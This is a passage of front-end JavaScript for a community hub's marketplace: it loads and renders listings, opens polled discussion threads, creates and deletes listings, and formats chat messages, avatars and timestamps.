    document.getElementById('hub-mkt-drawer').classList.remove('open');
    document.getElementById('hub-mkt-drawer-backdrop').classList.remove('open');
}

async function loadMarketplace(category) {
    const grid = document.getElementById('hub-mkt-list');
    grid.innerHTML = '<div class="hub-empty">Loading...</div>';
    closeMktThread();
    try {
        const r = await fetch(`/api/hub/marketplace?category=${encodeURIComponent(category)}`);
        const items = await r.json();
        grid.innerHTML = '';
        if (!items.length) { grid.innerHTML = '<div class="hub-empty">No listings in this category.</div>'; return; }
        items.forEach(item => grid.appendChild(buildMktCard(item)));
    } catch(e) {
        grid.innerHTML = '<div class="hub-empty">Failed to load listings.</div>';
    }
}

function buildMktCard(item) {
    const div = document.createElement('div');
    div.className = 'hub-mkt-card';
    div.style.cursor = 'pointer';

    const isNew = (Date.now() - new Date(item.created_at + (item.created_at.endsWith('Z') ? '' : 'Z')).getTime()) < 86400000;
    const listingType = item.listing_type || 'Selling';
    const typeClass = listingType === 'Buying' ? 'buying' : listingType === 'Trading' ? 'trading' : '';
    const typeSvg = mktTypeSvg(listingType);
    const priceHtml = item.price
        ? `<span class="hub-mkt-price">${escHtml(item.price)} ${escHtml(item.currency)}</span>`
        : `<span class="hub-mkt-price negotiable">Negotiable</span>`;

    div.innerHTML = `
        <div class="hub-mkt-main">
            <div class="hub-mkt-tags">
                <span class="hub-mkt-tag hub-mkt-tag-type ${typeClass}">${typeSvg} ${escHtml(listingType)}</span>
                <span class="hub-mkt-tag">${escHtml(item.category)}</span>
                ${isNew ? '<span class="hub-mkt-new-badge">NEW</span>' : ''}
            </div>
            <div class="hub-mkt-title-row">
                <span class="hub-mkt-title">${escHtml(item.title)}</span>
            </div>
            <div class="hub-mkt-desc"><span class="hub-mkt-desc-seller">${escHtml(item.seller_display || item.seller)}</span>: ${escHtml(item.description)}</div>
        </div>
        <div class="hub-mkt-right">
            ${priceHtml}
            <div class="hub-mkt-meta">${timeAgo(item.created_at)}${item.contact ? `<br><span class="hub-mkt-contact-pill">${escHtml(item.contact)}</span>` : ''}</div>
        </div>
    `;

    const canDelete = hubCurrentUser && (hubCurrentUser.username === item.seller || hubCurrentUser.role === 'admin');
    if (canDelete) {
        const del = document.createElement('button');
        del.className = 'hub-mkt-delete'; del.textContent = '×';
        del.onclick = (e) => { e.stopPropagation(); deleteListing(item.id, div); };
        div.appendChild(del);
    }

    div.addEventListener('click', () => openMktThread(item));
    return div;
}

function mktTypeSvg(t) {
    if (t === 'Buying') return `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="19 12 12 19 5 12"/><line x1="12" y1="5" x2="12" y2="19"/></svg>`;
    if (t === 'Trading') return `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="17 1 21 5 17 9"/><path d="M3 11V9a4 4 0 0 1 4-4h14"/><polyline points="7 23 3 19 7 15"/><path d="M21 13v2a4 4 0 0 1-4 4H3"/></svg>`;
    return `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="5 12 12 5 19 12"/><line x1="12" y1="19" x2="12" y2="5"/></svg>`;
}

// ── Thread / listing detail ───────────────────────────────────────────────────

async function openMktThread(item) {
    threadCurrentItem = item;
    document.getElementById('hub-mkt-list-view').style.display = 'none';
    document.getElementById('hub-mkt-thread').style.display = 'block';

    const listingType = item.listing_type || 'Selling';
    const typeClass = listingType === 'Buying' ? 'buying' : listingType === 'Trading' ? 'trading' : '';
    const priceStr = item.price ? `${escHtml(item.price)} ${escHtml(item.currency)}` : 'Negotiable';

    document.getElementById('hub-mkt-thread-header').innerHTML = `
        <div class="hub-thread-listing-card">
            <div class="hub-mkt-tags" style="margin-bottom:8px;">
                <span class="hub-mkt-tag hub-mkt-tag-type ${typeClass}">${mktTypeSvg(listingType)} ${escHtml(listingType)}</span>
                <span class="hub-mkt-tag">${escHtml(item.category)}</span>
            </div>
            <div class="hub-thread-listing-title">${escHtml(item.title)}</div>
            <div class="hub-thread-listing-desc">${escHtml(item.description)}</div>
            <div class="hub-thread-listing-meta">
                <span class="hub-thread-price">${priceStr}</span>
                <span class="hub-thread-seller-label">by <span>${escHtml(item.seller_display || item.seller)}</span></span>
                ${item.contact ? `<span class="hub-thread-contact">${escHtml(item.contact)}</span>` : ''}
                <span style="font-size:11px;color:var(--text-muted);margin-left:auto;">${timeAgo(item.created_at)}</span>
            </div>
        </div>
        <div class="hub-thread-section-label">Discussion</div>
    `;

    threadLastId = 0;
    document.getElementById('hub-mkt-thread-messages').innerHTML = '';
    await fetchThreadMessages();
    if (threadPollInterval) clearInterval(threadPollInterval);
    threadPollInterval = setInterval(fetchThreadMessages, 4000);
}

function closeMktThread() {
    if (threadPollInterval) { clearInterval(threadPollInterval); threadPollInterval = null; }
    threadCurrentItem = null;
    document.getElementById('hub-mkt-list-view').style.display = 'block';
    document.getElementById('hub-mkt-thread').style.display = 'none';
}

let threadLastId = 0;

async function fetchThreadMessages() {
    if (!threadCurrentItem) return;
    try {
        const r = await fetch(`/api/hub/marketplace/${threadCurrentItem.id}/comments`);
        const msgs = await r.json();
        const container = document.getElementById('hub-mkt-thread-messages');
        const atBottom = container.scrollHeight - container.scrollTop <= container.clientHeight + 60;
        const newMsgs = msgs.filter(m => m.id > threadLastId);
        if (newMsgs.length) {
            appendTgMessages(container, newMsgs, threadLastId, true);
            newMsgs.forEach(m => { threadLastId = Math.max(threadLastId, m.id); });
        }
        if (msgs.length === 0 && container.innerHTML === '') {
            container.innerHTML = '<div class="hub-empty" style="padding:20px 0;">No messages yet. Start the conversation.</div>';
        }
        if (atBottom) container.scrollTop = container.scrollHeight;
    } catch(e) {}
}

async function sendThreadMessage() {
    if (!threadCurrentItem) return;
    const input = document.getElementById('hub-mkt-thread-input');
    const message = input.value.trim();
    if (!message) return;
    input.value = '';
    try {
        await fetch(`/api/hub/marketplace/${threadCurrentItem.id}/comments`, {
            method: 'POST', headers: {'Content-Type':'application/json'},
            body: JSON.stringify({message})
        });
        fetchThreadMessages();
    } catch(e) {}
}

async function createListing() {
    const title = document.getElementById('mkt-title-input').value.trim();
    const description = document.getElementById('mkt-desc-input').value.trim();
    const category = document.getElementById('mkt-cat-select').value;
    const listing_type = document.getElementById('mkt-type-select').value;
    const price = document.getElementById('mkt-price-input').value.trim();
    const currency = document.getElementById('mkt-currency-select').value;
    const contact = document.getElementById('mkt-contact-input').value.trim();
    if (!title || !description) return;
    const r = await fetch('/api/hub/marketplace', {
        method: 'POST', headers: {'Content-Type':'application/json'},
        body: JSON.stringify({title, description, category, listing_type, price, currency, contact})
    });
    if (r.ok) {
        document.getElementById('mkt-title-input').value = '';
        document.getElementById('mkt-desc-input').value = '';
        document.getElementById('mkt-price-input').value = '';
        document.getElementById('mkt-contact-input').value = '';
        closeMktDrawer();
        mktActiveCategory = category;
        document.querySelectorAll('.hub-cat-btn').forEach(b => b.classList.toggle('active', b.dataset.cat === category));
        loadMarketplace(category);
    }
}

async function deleteListing(id, el) {
    await fetch(`/api/hub/marketplace/${id}`, {method:'DELETE'});
    el.remove();
}

// ── Helpers ───────────────────────────────────────────────────────────────────

// Build an avatar <div> (or <img>) sized px
function buildAvatarHtml(avatarUrl, name, px = 32) {
    const initial = (name || '?')[0].toUpperCase();
    const style = `width:${px}px;height:${px}px;border-radius:50%;overflow:hidden;background:var(--bg-raised);border:1px solid var(--border-color);display:inline-flex;align-items:center;justify-content:center;font-size:${Math.round(px*0.4)}px;font-weight:700;color:var(--primary);flex-shrink:0;`;
    if (avatarUrl) {
        return `<div style="${style}"><img src="${escHtml(avatarUrl)}" style="width:100%;height:100%;object-fit:cover;" alt=""></div>`;
    }
    return `<div style="${style}">${escHtml(initial)}</div>`;
}

// Append Telegram-style messages to a container
// prevLastId: last id before this batch (so we can detect grouping with existing DOM)
function appendTgMessages(container, msgs, prevLastId, withSellerBadge = false) {
    // Build a flat list of existing keys for grouping detection
    const existing = Array.from(container.querySelectorAll('[data-msg-user]'));
    let prevUser = existing.length ? existing[existing.length - 1].dataset.msgUser : null;
    let prevDay = existing.length ? existing[existing.length - 1].dataset.msgDay : null;

    msgs.forEach((m, i) => {
        const isOwn = m.username === hubCurrentUser?.username;
        const displayName = m.display_name || m.username;
        const dt = new Date((m.created_at || '') + (m.created_at && m.created_at.endsWith('Z') ? '' : 'Z'));
        const dayKey = dt.toDateString();
        const timeStr = dt.toLocaleTimeString([], {hour:'2-digit', minute:'2-digit'});

        // Day separator
        if (dayKey !== prevDay) {
            const sep = document.createElement('div');
            sep.className = 'hub-day-sep';
            sep.textContent = dayKey === new Date().toDateString() ? 'Today' : dt.toLocaleDateString([], {month:'long', day:'numeric'});
            container.appendChild(sep);
            prevDay = dayKey;
            prevUser = null;
        }

        const nextMsg = msgs[i + 1];
        const nextUser = nextMsg ? nextMsg.username : null;
        const sameAsPrev = prevUser === m.username;
        const sameAsNext = nextUser === m.username;

        let tailClass;
        if (!sameAsPrev && !sameAsNext) tailClass = 'tail-only';
        else if (!sameAsPrev && sameAsNext) tailClass = 'tail-start';
        else if (sameAsPrev && sameAsNext) tailClass = 'tail-mid';
        else tailClass = 'tail-end';

        const avatarHtml = buildAvatarHtml(m.avatar || '', displayName, 32);
        const sellerBadge = (withSellerBadge && m.is_seller) ? '<span class="hub-seller-badge">SELLER</span>' : '';
        const nameHtml = isOwn ? '' : `<div class="hub-msg-name">${escHtml(displayName)}${sellerBadge}</div>`;

        const wrap = document.createElement('div');
        wrap.className = `hub-msg ${isOwn ? 'own' : 'other'} ${tailClass}`;
        wrap.dataset.msgUser = m.username;
        wrap.dataset.msgDay = dayKey;
        wrap.innerHTML = `
            <div class="hub-msg-avatar">${avatarHtml.replace(/style="[^"]*"/, '')}</div>
            <div class="hub-msg-bubble">
                ${nameHtml}
                <div class="hub-msg-text">${escHtml(m.message)}</div>
                <div class="hub-msg-time-row"><span class="hub-msg-time">${timeStr}</span></div>
            </div>
        `;

        // Fix avatar: use proper element not inner html
        const avatarEl = wrap.querySelector('.hub-msg-avatar');
        avatarEl.innerHTML = '';
        if (m.avatar) {
            const img = document.createElement('img');
            img.src = m.avatar; img.alt = '';
            img.style.cssText = 'width:100%;height:100%;object-fit:cover;';
            avatarEl.appendChild(img);
        } else {
            avatarEl.textContent = (displayName || '?')[0].toUpperCase();
        }

        container.appendChild(wrap);
        prevUser = m.username;
    });
}

function escHtml(str) {
    return String(str).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
}

function fmtDate(dt) {
    const d = new Date(dt + (dt.endsWith('Z') ? '' : 'Z'));
    return d.toLocaleDateString([], {month:'short',day:'numeric'}) + ' ' + d.toLocaleTimeString([], {hour:'2-digit',minute:'2-digit'});
}

function timeAgo(dt) {
    const diff = Math.floor((Date.now() - new Date(dt + (dt.endsWith('Z') ? '' : 'Z')).getTime()) / 1000);
    if (diff < 60) return 'just now';
    if (diff < 3600) return `${Math.floor(diff/60)} min. ago`;
    if (diff < 86400) return `${Math.floor(diff/3600)} hr. ago`;
    if (diff < 86400*30) return `${Math.floor(diff/86400)} d. ago`;
    return `${Math.floor(diff/86400/30)} mo. ago`;
}
